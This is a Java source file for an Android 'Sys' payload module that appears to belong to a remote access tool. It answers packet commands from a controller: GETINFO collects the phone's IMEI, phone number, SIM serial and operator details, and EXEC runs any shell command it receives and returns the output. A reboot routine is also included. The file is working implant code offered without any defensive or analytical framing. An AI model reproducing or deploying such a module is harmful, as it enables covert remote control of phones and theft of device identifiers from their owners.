package com.core.payloads;

import android.app.Activity;
import android.content.Context;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import com.corelib.IPayload;
import com.corelib.Packet;
import java.io.BufferedReader;
import java.io.InputStreamReader;

/**
 * Sys class
 * Created by hkff on 4/24/15.
 */
public class Sys implements IPayload {

    //-----------------------------------------------------------//
    public enum Commands {
        GETINFO,
        PING,
        EXIT,
        HELP,
        EXEC,
    }

    @Override
    public String man() {
        return "";
    }

    /***
     * Handle msg
     * @param msg
     * @return
     */
    @Override
    public Packet handle(Packet msg) {
        // The result to return
        Packet result = new Packet("NO_COMMAND_PROVIDED", Packet.Type.STRING);

        // Get the command (and convert it to uppercase)
        String cmd0 = msg.getMsg().toUpperCase();

        // Check if the command exists in our Commands enumeration
        Commands cmd;
        try{
            cmd = Commands.valueOf(cmd0);
        } catch (IllegalArgumentException e){
            // If there is no command, we return an error message
            result.setType(Packet.Type.NONE);
            return result;
        }

        // Parse args
        String[] tmp = new String(msg.getContent()).split(":");

        // We handle the command
        switch (cmd){
            // PING command
            case PING:
                // We just reply to the client with the message PONG
                result.setMsg("PONG");
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                break;

            // exit command
            case EXIT:
                // We just return the message EXIT
                result.setMsg("EXIT");
                break;

            // Get Info
            // Protocol : GETINFO
            case GETINFO:
                result.setMsg(this.getInfo());
                break;

            // Execute a shell command
            // Protocol : EXEC:cmd
            case EXEC:
                String shell = (tmp.length > 0)? tmp[0] : "";
                result.setMsg(this.exec(shell));
                break;
        }

        return result;
    }
    //-----------------------------------------------------------//


    // Attributes
    public Activity app;

    @Override
    public void setApp(Activity app) {
        this.app = app;
    }

    public Sys(){}

    /**
     * Constructor
     * @param app
     */
    public Sys(Activity app){
        this.app = app;
    }

    /**
     * Get system information
     */
    public String getInfo() {
        String result;
        TelephonyManager tm = (TelephonyManager) app.getSystemService(Context.TELEPHONY_SERVICE);
        result = "- IMEI : " + tm.getDeviceId() +
            " - PhoneNumber : " + tm.getLine1Number() +
            " - Country : " + tm.getNetworkCountryIso() +
            " - Operator : " + tm.getNetworkOperatorName() +
            " - SimCountry : " + tm.getSimCountryIso() +
            " - SimOperator : " + tm.getSimOperator() +
            " - SimSerial : " + tm.getSimSerialNumber();
        return result;
    }

    /**
     * Reboot phone
     * @return
     */
    public String reboot() {
        String result = "Rebooting...";
        PowerManager pm = (PowerManager) app.getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "SYSTEM");
        wl.acquire();
        pm.reboot("System");
        wl.release();
        return result;
    }

    /**
     * Execute a shell command
     * @param shell
     * @return
     */
    public String exec(String shell) {
        String result = "";
        Process p;
        try {
            p = Runtime.getRuntime().exec(shell);
            p.waitFor();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

            String line;
            while ((line = reader.readLine())!= null) {
                result += line + "\n";
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        return result;
    }
}
